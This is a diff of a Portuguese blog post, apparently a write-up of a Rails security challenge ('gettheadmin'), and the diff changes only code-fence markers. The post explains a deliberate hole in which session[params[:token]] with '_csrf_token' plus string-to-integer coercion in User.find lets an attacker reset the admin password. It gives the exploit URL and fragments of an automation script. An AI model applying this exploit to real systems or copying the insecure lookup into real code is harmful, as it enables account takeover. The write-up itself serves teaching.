@@ -64,7 +64,7 @@ class LoginController < ApplicationController
   end
  
 end
----
+```
 
 Basicamente um trecho do arquivo de <tt>routes.rb</tt> e o <tt>login_controller.rb</tt>. Assuma que também tem um form que poderia ser algo assim:
 
@@ -74,7 +74,7 @@ Basicamente um trecho do arquivo de <tt>routes.rb</tt> e o <tt>login_controller.
   <%= password_field_tag 'password' %>
   <%= submit_tag 'login' %>
 <% end %>
----
+```
 
 E um model chamado <tt>User</tt> que poderia ter a seguinte migration:
 
@@ -90,13 +90,13 @@ class CreateUsers < ActiveRecord::Migration
     end
   end
 end
----
+```
 
 E, finalmente, um seed que poderia ter o seguinte:
 
----
+```
 User.create token: 'qualquercoisa', login: 'admin', password: 'qualquercoisa'
----
+```
 
 Primeiro entenda o que o controller faz:
 
@@ -125,7 +125,7 @@ Quando o form é renderizado, ele gera um HTML assim:
 
 </body>
 </html>
----
+```
 
 O importante: o token CSRF na tag de meta. Ele é diferente toda vez que você puxa o formulário e serve para evitar [Cross Site Request Forgery](http://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf). Mas tem um detalhe importante: quando a session é inicializada ele sempre vai ter pelo menos duas chave-valor: uma que é a "session_id" e outra com a chave "_csrf_token" com o valor que aparece no HTML justamente para fazer a checagem.
 
@@ -134,13 +134,13 @@ E a parte que é o buraco no controller é este:
 --- ruby
 user_id = session[params[:token]]
 @user = User.find(user_id) if user_id
----
+```
 
 Se o <tt>params[:token]</tt> for "_csrf_token", o equivalente ficaria assim:
 
 --- ruby
 @user = User.find(session['_csrf_token'])
----
+```
 
 Agora, sabemos que o <tt>User.create</tt> inicial vai criar um admin com o ID que será o inteiro "1". O método <tt>#find</tt> aceita não só números como strings (para o caso, por exemplo, onde você cria uma renderização alternativa de ID para fazer URLs bonitas como no Wordpress onde ficaria "/1-admin" em vez de "/1"). 
 
@@ -148,7 +148,7 @@ Quando você faz:
 
 --- ruby
 "1abcd".to_i # => 1
----
+```
 
 Note que ele ignora o que não é string e devolve o inteiro 1.
 
@@ -162,13 +162,13 @@ if params[:password] && @user && params[:password].length > 6
       return
     end
 end
----
+```
 
 Ou seja, ele grava a nova senha que você passar como parâmetro. Portanto a URL para exploit é:
 
----
+```
 http://gettheadmin.herokuapp.com/reset/_csrf_token?password=1234567
----
+```
 
 E para automatizar o exploit, fiz este pequeno script:
 
@@ -189,7 +189,7 @@ require 'mechanize'
     break if doc.content =~ /password changed/
   end
 end
----
+```
 
 Quando o script parar, a senha mudou pra "1234567", agora basta fazer login com o usuário "admin" e senha "1234567" e pronto, você está dentro!
 
